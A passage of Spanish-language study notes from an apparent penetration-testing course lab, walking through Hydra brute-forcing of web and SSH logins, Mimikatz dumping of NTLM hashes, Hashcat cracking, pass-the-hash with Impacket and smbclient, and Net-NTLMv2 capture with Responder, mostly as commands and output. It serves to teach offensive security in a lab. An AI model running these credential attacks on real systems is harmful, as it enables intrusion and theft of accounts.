hydra 192.168.187.52 http-post-form "/:username=^USER^&password=^PASS^&submit=submit:Unauthorized" -l offsec -P /usr/share/wordlists/rockyou.txt -vv 
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-07 15:19:52
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://192.168.187.52:80/:username=^USER^&password=^PASS^&submit=submit:Unauthorized
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ERROR] the target is using HTTP auth, not a web form, received HTTP error code 401. Use module "http-get" instead.
```

Pero en seguida se nos comunica que el formato utilizado no es válido y que utilicemos 'http-get'. Así, empleamos:

```
hydra 192.168.187.52 http-get -l offsec -P /usr/share/wordlists/rockyou.txt -vv 
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-07 15:22:17
[WARNING] You must supply the web page as an additional option or via -m, default path set to /
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://192.168.187.52:80/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[80][http-get] host: 192.168.187.52   login: offsec   password: pamela
[STATUS] attack finished for 192.168.187.52 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-07 15:22:31
```

Nos logeamos y recuperamos la flag.

<br />

**6.  You have found this list of possible employee username on target VM #5 inside the _users.txt_ file on the web server's root path. Use this list and a password attack technique to log into this website.**

Acudimos a *http://\<IP\>/users.txt* y obtenemos la lista de posibles usuarios. De esta forma, la copiamos sobre un fichero *users.txt*, seguidamente acudimos a la página http://<IP\>/wp-login.php. 

Una vez en la página activamos DevTools y acudimos a la pestaña de Network, realizamos una request de logeo y pinchamos sobre la request que es un tipo post y vamos dentro de la pestaña Network a la pestaña Request:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230308112923.png' | relative_url }}" text-align="center"/>
</div>

Así, con esto obtenemos los parámetros de la post-request y formamos el siguiente comando con hydra:

```bash
hydra 192.168.227.52 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.227.52%2Fwp-admin%2F&testcookie=1:Unknown username. Check again or try your email address." -L users.txt -p TEST -vv
```

Observemos que el valor del parámetro 'redirect_to' esta codificado en URL.

Además, debemos fijarnos en el mesnaje de error que devuelve la página "Unknown username." De esta forma, primero detectamos un nombre de uusario valido:

```
hydra 192.168.227.52 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.227.52%2Fwp-admin%2F&testcookie=1:Unknown username. Check again or try your email address." -L users.txt -p TEST -vv -t 12
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-08 05:48:31
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 12 tasks per 1 server, overall 12 tasks, 43 login tries (l:43/p:1), ~4 tries per task
[DATA] attacking http-post-form://192.168.227.52:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.227.52%2Fwp-admin%2F&testcookie=1:Unknown username. Check again or try your email address.
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[80][http-post-form] host: 192.168.227.52   login: jeremy   password: TEST
[STATUS] attack finished for 192.168.227.52 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```

Y ahora, procedemos a descubrir la contraseña del usuario:

```
hydra 192.168.227.52 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.227.52%2Fwp-admin%2F&testcookie=1:Error" -l jeremy -P /usr/share/wordlists/rockyou.txt -vv -t 12 
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-08 05:52:41
[DATA] max 12 tasks per 1 server, overall 12 tasks, 14344399 login tries (l:1/p:14344399), ~1195367 tries per task
[DATA] attacking http-post-form://192.168.227.52:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.227.52%2Fwp-admin%2F&testcookie=1:Error
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] Page redirected to http[s]://192.168.227.52:80/wp-admin/
[VERBOSE] Page redirected to http[s]://192.168.227.52:80/wp-login.php?redirect_to=http%3A%2F%2F192.168.227.52%3A80%2Fwp-admin%2F&reauth=1
[80][http-post-form] host: 192.168.227.52   login: jeremy   password: chicken
[STATUS] attack finished for 192.168.227.52 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-08 05:52:50
```


<br />

**7.  Use a password attack technique to log into the target VM #6 via SSH with the user _offsec_.**

```BASH
hydra 192.168.227.52 -l offsec -P /usr/share/wordlists/rockyou.txt -t 20 ssh -s 2222
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-08 06:01:39
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 20 tasks per 1 server, overall 20 tasks, 14344399 login tries (l:1/p:14344399), ~717220 tries per task
[DATA] attacking ssh://192.168.227.52:2222/
[STATUS] 166.00 tries/min, 166 tries in 00:01h, 14344235 to do in 1440:12h, 18 active
[2222][ssh] host: 192.168.227.52   login: offsec   password: 00000
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-08 06:02:55
```

<br />

**8.  The _shadow man_ admin messed up the configurations on the target VM #7 server and gave you access to see something he shouldn't have. Can you use this access to read the flag?**

Nos logeamos en la máquina con student:lab en el puerto 2222 a través de ssh y copiamos la lista de contraseñas del ficheor 'passwords.txt' y la utilizamos junto con hydra para descubrir la contraseña del usuario 'shadow-man':

```
hydra 192.168.227.52 -l shadow-man -P wordlist.txt -vv -s 2222 ssh -t 10 
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-08 06:15:37
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 10 tasks per 1 server, overall 10 tasks, 196 login tries (l:1/p:196), ~20 tries per task
[DATA] attacking ssh://192.168.227.52:2222/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://shadow-man@192.168.227.52:2222
[INFO] Successful, password authentication is supported by ssh://192.168.227.52:2222
[STATUS] 100.00 tries/min, 100 tries in 00:01h, 96 to do in 00:01h, 10 active
[2222][ssh] host: 192.168.227.52   login: shadow-man   password: rafael
[STATUS] attack finished for 192.168.227.52 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-08 06:17:25
```

Así, una vez dsabemos la contraseña, obtenemos la flag:

```
su shadow-man
Password: 
shadow-man@abbb05bd4e0d:~$ cat flag.txt
OS{a7cb3701aa683cef1890bbecfc8ebfeb}
shadow-man@abbb05bd4e0d:~$ 
```

<br />

### 21.3. Working with Password Hashes

#### 21.3.1. Cracking NTLM, Mimikatz.

NTLM user authentication, es un protocolo de autenticación propio de Windows de tipo Challenge/Reponse. Concretamente, NTLM plantea a un cliente que quiere autenticarse un reto.

- Primero al cliente se le envía un string, un reto. 

- El cliente pide al usuario su contraseña y utiliza el hash de la misma en un algoritmo para transformar el string y reenviarlo al servidor. 

- El servidor a su vez recoge el string transformado del cliente y con el hash de la contraseña del usuario almacenada en el mismo servidor transforma su propio string y compara ambos strings transformados.

- Si coinciden el cliente ha superado el reto y por tanto ha aportado unas credenciales válidas y si no coinciden el cliente no supera el reto y por tanto no se logea. 

Por otra parte, Windows guarda los hashes de contraseñas (en NTLM sin salt, los saltos son bits random que se adhieren al final de una contraseña antes de proceder a su hasheo y están diseñados para ) en el Security Account Manager o SAM database en *C:\\Windows\\system32\\config\\sam*.

Estos archivos no pueden ser movidos o copiados de su localización mientras el sistema operativo se ejecuta ya que Windows implementa un bloqueo de ficheros. 

Afortunadamente, podemos usar la herramienta _Mimikatz_ para hacer el trabajo pesado por nosotros y eludir esta restricción. Mimikatz proporciona la funcionalidad para extraer contraseñas de texto sin formato y hash de contraseñas de varias fuentes en Windows y aprovecharlas en otros ataques como *pass-the-hash*. Mimikatz también incluye el módulo _sekurlsa_ , que extrae hashes de contraseñas de la memoria de proceso del _Subsistema de Autoridad de Seguridad Local_ (LSASS). LSASS es un proceso en Windows que maneja la autenticación de usuario, los cambios de contraseña y la creación del _access token_.

LSASS es importante debido a que almacena en caché hashes NTLM y otras credenciales que podemos extraer usando el módulo 'sekurlsa' Mimikatz. Necesitamos entender que LSASS se ejecuta bajo el usuario del SYSTEM y, por lo tanto, tiene incluso más privilegios que un proceso iniciado como Administrador.

Debido a esto, solo podemos extraer contraseñas si:

- Estamos ejecutando Mimikatz como Administrador (o superior) 
- Tenemos habilitado el derecho de acceso _SeDebugPrivilege_. Este derecho de acceso nos otorga la capacidad de debugear no solo los procesos que poseemos, sino también los procesos de todos los demás usuarios.

También podemos elevar nuestros privilegios a la cuenta _SYSTEM_ con herramientas como _PsExec_ o la función de _elevación de token Mimikatz_ incorporada para obtener los privilegios requeridos. La función de elevación del token requiere el derecho de acceso _SeImpersonatePrivilege_ para funcionar, pero todos los administradores locales lo tienen por defecto.

Ahora que tenemos una comprensión básica de qué son los hashes NTLM y dónde podemos encontrarlos, demostremos cómo obtenerlos y descifrarlos.

Recuperaremos las contraseñas del SAM de la máquina MARKETINGWK01 en 192.168.50.210. Podemos iniciar sesión en el sistema a través de RDP como usuario _offsec_, utilizando _lab_ como contraseña.

Comenzaremos usando _Get-LocalUser_ para verificar qué usuarios existen localmente en el sistema.

```
PS C:\Users\offsec> Get-LocalUser

Name               Enabled Description
----               ------- -----------
Administrator      False   Built-in account for administering the computer/domain
DefaultAccount     False   A user account managed by the system.
Guest              False   Built-in account for guest access to the computer/domain
nelly              True
offsec             True
WDAGUtilityAccount False   A user account managed and used by the system for Windows Defender Application Guard scen...
...
```

El resultado del Listado 37 indica la existencia de otro usuario llamado _nelly_ en el sistema MARKETINGWK01. Nuestro objetivo en este ejemplo es obtener la contraseña de texto sin formato de _nelly_ recuperando el hash NTLM y crakeandolo.

Ya sabemos que las credenciales de los usuarios se almacenan cuando inician sesión en un sistema Windows, pero las credenciales también se almacenan de otras formas. Por ejemplo, las credenciales también se almacenan cuando se ejecuta un servicio con una cuenta de usuario.

Usaremos Mimikatz (ubicado en **C:\\tools\\mimikatz.exe** ) para verificar las credenciales almacenadas en el sistema. Comencemos PowerShell como administrador haciendo clic en el ícono de Windows en la barra de tareas y escribiendo "powershell". Seleccionaremos _Windows PowerShell_ y haremos clic en _Ejecutar como administrador_ como se muestra en la siguiente figura. Confirmaremos la ventana emergente _del Control de cuentas de usuario_ (UAC) haciendo clic en _Sí_ .

En la ventana de PowerShell, cambiaremos a **C:\tools** e iniciaremos Mimikatz.

```
PS C:\Windows\system32> cd C:\tools

PS C:\tools> ls

    Directory: C:\tools


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/31/2022  12:25 PM        1355680 mimikatz.exe

PS C:\tools> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #
```

Según el indicador, Mimikatz se está ejecutando y podemos interactuar con él a través de su entorno de línea de comandos. Cada comando consta de un módulo y un comando delimitado por dos puntos, por ejemplo, **privilege::debug**.

Podemos usar varios comandos para extraer contraseñas del sistema. Uno de los comandos más comunes de Mimikatz es **sekurlsa::logonpasswords** , que intenta extraer contraseñas de texto sin formato y hash de contraseñas de todas las fuentes disponibles. Dado que esto genera una gran cantidad de resultados, en su lugar usaremos **lsadump::sam** , que extraerá los hashes NTLM del SAM. Para este comando, primero debemos ingresar **token::elevate** para elevar a los privilegios de usuario del SISTEMA.

Para ambos comandos, **sekurlsa::logonpasswords** y **lsadump::sam** , debemos tener habilitado el derecho de acceso SeDebugPrivilege, lo cual lograremos con **privilegio::debug** .

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

656     {0;000003e7} 1 D 34811          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;000413a0} 1 F 6146616     MARKETINGWK01\offsec    S-1-5-21-4264639230-2296035194-3358247000-1001  (14g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 6217216     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
 
mimikatz # lsadump::sam
Domain : MARKETINGWK01
SysKey : 2a0e15573f9ce6cdd6a1c62d222035d5
Local SID : S-1-5-21-4264639230-2296035194-3358247000
 
RID  : 000003e9 (1001)
User : offsec
  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
 
RID  : 000003ea (1002)
User : nelly
  Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10
...
```

El resultado muestra que habilitamos con éxito el derecho de acceso SeDebugPrivilege y obtuvimos privilegios de usuario del SISTEMA. La salida del comando **lsadump::sam** revela dos hashes NTLM, uno para _offsec_ y otro para _nelly_ . Como ya sabemos que el hash NTLM de _offsec_ se calculó a partir de la contraseña de texto sin formato "lab", lo omitiremos y nos centraremos en el hash NTLM _de Nelly_ .

Copiemos el hash NTLM y péguelo en **nelly.hash** en el directorio **passwordattacks** de nuestra máquina Kali.

```
kali@kali:~/passwordattacks$ cat nelly.hash     
3ae8e5f0ffabb3a627672e1600f1ba10
```

A continuación, recuperaremos el modo hash correcto de la salida de ayuda de Hashcat.

```
kali@kali:~/passwordattacks$ hashcat --help | grep -i "ntlm"   
                                                                            
   5500 | NetNTLMv1 / NetNTLMv1+ESS                           | Network Protocol
  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                      | Network Protocol
   5600 | NetNTLMv2                                           | Network Protocol
  27100 | NetNTLMv2 (NT)                                      | Network Protocol
   1000 | NTLM                                                | Operating System
```

La salida indica que el modo correcto es 1000.

Ahora tenemos todo lo que necesitamos para comenzar a descifrar el hash NTLM. Ya extrajimos el hash porque Mimikatz genera un formato que acepta Hashcat. El siguiente paso es elegir una lista de palabras y un archivo de reglas. Para este ejemplo, usaremos la lista de palabras **rockyou.txt** con el archivo de reglas **best64.rule , que contiene 64 reglas efectivas.**

Proporcionemos todos los argumentos y valores al comando **hashcat** para iniciar el proceso de craqueo.

```
kali@kali:~/passwordattacks$ hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
hashcat (v6.2.5) starting
...
3ae8e5f0ffabb3a627672e1600f1ba10:nicole1                  
                                                          
Session..........: hashca
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 3ae8e5f0ffabb3a627672e1600f1ba10
Time.Started.....: Thu Jun  2 04:11:28 2022, (0 secs)
Time.Estimated...: Thu Jun  2 04:11:28 2022, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 17926.2 kH/s (2.27ms) @ Accel:256 Loops:77 Thr:1 Vec:8
...
```

El resultado muestra que desciframos con éxito el hash NTLM del usuario _nelly_ . La contraseña de texto sin formato utilizada para crear este hash es _nicole1_ . Confirmemos esto conectándonos al sistema con RDP.

<br />

**2. Access VM #2 via RDP as user _nadine_ with the password retrieved in the exercise of the section labelled "Password Manager" and leverage the methods from this section to extract the NTLM hash of the user _steve_. Use best64.rule for the cracking process and enter the plain text password as answer to this exercise.**

Primero accedemos como el usuario Nadine:

```
xfreerdp /v:192.168.221.227 /u:nadine /p:123abc
```

Seguidamente, empleamos Mimikatz y obtenemos el hash NTLM del usuario steve iniciando una CMD como administrador.

Seguidamente, guardamos dicho hash en un fichero y lo crackeamos con Hashcat:

```
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --show
2835573fb334e3696ef62a00e5cf7571:francesca77
```

<br />

#### 21.3.2. Passing NTML.

En ocasiones, el crackeo the contraseñas NTLM puede ser inviable debido a la fortaleza de la contraseña. Sin embargo, aún podemos aprovecharnos de un NTLM hash sin necesidad de crackearlo a través de la técnica *pass-the-hass*.

Esta técnica consiste en realizar un intento de autenticación en un servicio probando una combinación del username y el hash de la contraseña en lugar de la contraseña en texto plano.

Esto es posible entre otras cosas gracias a que los hashes NTLM/LM no añaden salts y permanecen estáticos entre sesiones e incluso entre dispositivos, en la medida en la que las credenciales (username:password) sean las mismas tendrán el mismo NTLM hash en distintos dispositivos. 

Además, para conseguir RCE necesitamos que la cuenta a la que accedemos tenga privilegios administrativos, de lo contrario la técnica todavía es posible pero la máquina debe tener una configuración específica que puede no ser frecuente. Más especificamente, sucede que desde Windows Vista, todas las versiones de Microsoft Windows poseen restricciones de la UAC (User Account Control) habilitadas por defecto. A su vez, estas restricciones están orientadas a prevenir el acceso de software desconocido a privilegios administrativos sin consentimiento previo y tiene un efecto considerable mitigando nuestro ataque de *pash-the-hash*.

As an example, we supose that we have a GUI access to a Windows client under the credentials; gunther:password123!. The next thing we wanna do is try to elevate our privileges. So we check our permissions:

```
PS C:\Users\gunther> whoami /groups

[...]   
BUILTIN\Administrators  
[...]
```

We see that we are part of the Administrator group, so we use 'mimikatz', we open a Powershell session as Administrator:

```
PS C:\Windows\system32> C:\tools\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

584     {0;000003e7} 1 D 38986          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;000adf0e} 2 F 1863421     FILES01\gunther S-1-5-21-1555802299-1328189896-734683769-1006   (15g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 1922712     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz # lsadump::sam
Domain : FILES01
SysKey : 509cc0c46295a3eaf4c5c8eb6bf95db1
Local SID : S-1-5-21-1555802299-1328189896-734683769

SAMKey : 201b0e3078f2be635aaaa055ab5a7828

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 7a38310ea6f0027ee955abed1762964b

[...]
```

Ahora que tenemos el NTLM hash de una cuenta con privilegios administrativos necesitamos herramientas

- *smbclient* for SMB enumeration.
- from *impacket* library; psexec.py and wmiexec.py.
- *evil-winrm*
- *mimikatz*

Vamos a usar el script psexec de la colección Impacket.

```
/usr/share/doc/python3-impacket/examples/psexec.py  -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.238.211
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 192.168.238.211.....
[*] Found writable share ADMIN$
[*] Uploading file emPsaVUx.exe
[*] Opening SVCManager on 192.168.238.211.....
[*] Creating service yYaL on 192.168.238.211.....
[*] Starting service yYaL.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.707]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> type C:\Users\Administrator\Desktop\flag.txt
OS{a886856d0332b299b727c882686d321d}
```

También pdoemos utilizar el hash con smbclient para utilizarlo contra un share:

```
kali@kali:~$ smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Jun  2 16:55:37 2022
  ..                                DHS        0  Thu Jun  2 16:55:35 2022
  secrets.txt                         A        4  Thu Jun  2 11:34:47 2022

                4554239 blocks of size 4096. 771633 blocks available

smb: \> get secrets.txt
getting file \secrets.txt of size 4 as secrets.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```

También, queda el script wmiexec de también la colección Impacket:

```
kali@kali:~$ impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
files02\administrator

C:\>
```



#### 21.2.3. Cracking Net-NTLMv2. Responder.

En muchas ocasiones en las que estemos realizando una prueba de penetración podemos llegar a obtener un RCE bajo un usuario sin privilegios y en ese caso no podemos utilizar Mimikatz para extraer hashes de contraseña. 

En contextos como este todavía podemos abusar de *Net-NTLMv2*, que se trata de un protocolo de autenticación de red responsable de manejar procesos de autenticación entre clientes Windows y servicios sobre la red y que se asume como la continuación del protocolo NTLM.

Para hacer esto, necesitamos que el target inicie un proceso de autenticación usando Net-NTLMv2 contra un sistema que controlamos. Necesitamos preparar nuestro sistema para que maneje el proceso de autenticación y nos muestre el hash Net-NTLMv2 que se usó para la autenticación. Podemos hacer uso de la herramienta Responder. Incluye un servidor SMB incorporado que maneja el proceso de autenticación por nosotros e imprime todos los hashes Net-NTLMv2 capturados. Si bien también incluye otros servidores de protocolo (incluidos HTTP y FTP), así como _resolución de nombres de multidifusión local de vínculo_ (LLMNR), _servicio de nombres NetBIOS_ ( NBT-NS) y _DNS de multidifusión_ (MDNS) capacidades de envenenamiento. En esta sección, nos centraremos en capturar hashes de Net-NTLMv2 con el servidor SMB.

Si hemos obtenido RCE sobre el target podemos a través de PowerShell forzar esta conexión contra nuestro sistema con el comando:

```
ls \\<Local-IP>\share
```

Si no, todavía podemos forzar esta conexión. Por ejemplo, cuando descubrimos un formulario de subida de archivos en una aplicación web en un servidor de Windows, podemos intentar ingresar un archivo inexistente con una ruta UNC como \\\\\<Local-IP>\\share\\nonexistent.txt. Si la aplicación web admite cargas a través de SMB, el servidor de Windows se autenticará en nuestro servidor SMB.

Así, supongámos que hemos logrado instralar un backdoor en un cliente:

```
kali@kali:~$ nc 192.168.199.211 4444
Microsoft Windows [Version 10.0.20348.707]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Accedemos al sistema y examinamos el contexto del usuario con el que hemos obtenido acceso:

```
C:\Windows\system32>whoami /all
whoami /all

USER INFORMATION
----------------

User Name    SID                                          
============ =============================================
files01\paul S-1-5-21-1555802299-1328189896-734683769-1007


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes                                        
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                     Well-known group S-1-5-3      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                    


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

Este usuario no forma parte del grupo de administradores pero sin embargo si forma parte del group RDP. Así, sería útil obtener sus credenciales. 

Para ello forzamos una autenticación remota sobre un servidor bajo nuestro control para capturar las credenciales:

```
C:\Windows\system32>dir \\192.168.45.176\test
dir \\192.168.45.176\test
Access is denied.
```

En el comando anterior estamos intentando listar remotamente un directorio 'test' en una máquina cuya IP es 192.168.45.176, que es una máquina sobre la que tenemos control. En esta máquina además hemos activado la utilidad Responder:

```
kali@kali:~$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
[...]
	SMB server                 [ON]
[...]
+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [192.168.45.176]
    Responder IPv6             [fe80::9b22:19e:4e25:7f83]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']
[...]
[+] Listening for events...                                                                                         

[SMB] NTLMv2-SSP Client   : 192.168.199.211
[SMB] NTLMv2-SSP Username : FILES01\paul
[SMB] NTLMv2-SSP Hash     : paul::FILES01:72d22da8b3aefa0e:C7D2976D1CEFF66576D613DC947E13EB:01010000000000000079719A9D84D9018050A47218BFB5230000000002000800590048004A00410001001E00570049004E002D0054005A0051004E00520032004300390039004B004C0004003400570049004E002D0054005A0051004E00520032004300390039004B004C002E00590048004A0041002E004C004F00430041004C0003001400590048004A0041002E004C004F00430041004C0005001400590048004A0041002E004C004F00430041004C00070008000079719A9D84D901060004000200000008003000300000000000000000000000002000007F1BD75BAE0FFDE594BCA74C62B4D3CB1656AEC27E52436EB09106E3AC6C5C580A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100370036000000000000000000
```

Al intentar listar remotamente un directorio se ha forzado una autenticación remota que nuestro sistema ha capturado. Ahora tenemos el NTLM hash del usuario paul y podemos intentar crakearlo:

```
kali@kali:~/labs$ hashid paulhash.txt                                           
--File 'hash.txt'--
Analyzing 'paul::FILES01:72d22da8b3aefa0e:C7D2976D1CEFF66576D613DC947E13EB:01010000000000000079719A9D84D9018050A47218BFB5230000000002000800590048004A00410001001E00570049004E002D0054005A0051004E00520032004300390039004B004C0004003400570049004E002D0054005A0051004E00520032004300390039004B004C002E00590048004A0041002E004C004F00430041004C0003001400590048004A0041002E004C004F00430041004C0005001400590048004A0041002E004C004F00430041004C00070008000079719A9D84D901060004000200000008003000300000000000000000000000002000007F1BD75BAE0FFDE594BCA74C62B4D3CB1656AEC27E52436EB09106E3AC6C5C580A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100370036000000000000000000'
[+] NetNTLMv2 
--End of file 'hash.txt'--

kali@kali:~/labs$ hashcat -h | grep -i NTLM
   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol
  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol
   5600 | NetNTLMv2                                                  | Network Protocol
  27100 | NetNTLMv2 (NT)                                             | Network Protocol
   1000 | NTLM                                                       | Operating System

